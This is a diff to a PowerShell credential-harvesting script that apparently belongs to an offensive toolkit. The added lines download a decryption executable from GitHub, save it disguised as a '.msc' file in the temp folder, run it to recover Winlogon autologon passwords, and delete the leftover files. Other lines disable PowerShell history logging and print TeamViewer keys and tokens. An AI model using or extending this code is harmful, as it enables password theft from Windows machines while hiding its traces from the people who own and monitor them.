@@ -7,7 +7,7 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.4
+   PS cmdlet Dev version: v1.1.4
 
 .DESCRIPTION
    -GetPasswords [ Enum ] searchs creds in store\regedit\disk diferent locations.
@@ -57,9 +57,11 @@
 
 
 Write-Host ""
-If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
 ## Disable Powershell Command Logging for current session.
 Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
+$Working_Directory = pwd|Select-Object -ExpandProperty Path
+
+If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
 
     ## Local function variable declarations
     $VulnDll = "$Env:WINDIR\" + "System32\0evilpwfilter." + "dll" -Join ''
@@ -106,6 +108,19 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
         Write-Host "TeamViewer    : $TeamVieweKey"
         Write-Host "TeamViewerAES : $PasswordAES"
 
+
+        ## Checking winlogon for crypted credentials
+        # Download and masquerade standalone executable to look like one .msc archive
+        Write-Host "`nScanning winlogon for crypted creds!" -ForegroundColor Green
+        Write-Host "------------------------------------";Start-Sleep -Seconds 1
+        iwr -Uri https://raw.githubusercontent.com/securesean/DecryptAutoLogon/main/DecryptAutoLogon/bin/Release/DecryptAutoLogon.exe -OutFile $Env:TMP\DecryptAutoLogon.msc|Out-Null
+        If(-not(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc" -EA SilentlyContinue)){
+           Write-Host "[error] not found: $Env:TMP\DecryptAutoLogon.msc" -ForegroundColor Red -BackgroundColor Black
+        }Else{## Decrypting autologon credentials
+           &"$Env:TMP\DecryptAutoLogon.msc"
+        }
+
+
         ## Checking ConsoleHost_History for credentials
         Write-Host "`nScanning ConsoleHost_History for creds!" -ForegroundColor Green
         Write-Host "-------------------------------------";Start-Sleep -Seconds 1
@@ -148,7 +163,10 @@ Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
                   Write-Host "$token"
               }
            }
+
+           ## Delete ALL artifacts left behind
            If(Test-Path -Path "$Env:TMP\passwd.txt"){Remove-Item -Path "$Env:TMP\passwd.txt" -Force}
+           If(Test-Path -Path "$Env:TMP\DecryptAutoLogon.msc"){Remove-Item -Path "$Env:TMP\DecryptAutoLogon.msc" -Force}
         }
      
     }ElseIf($GetPasswords -ieq "Dump"){
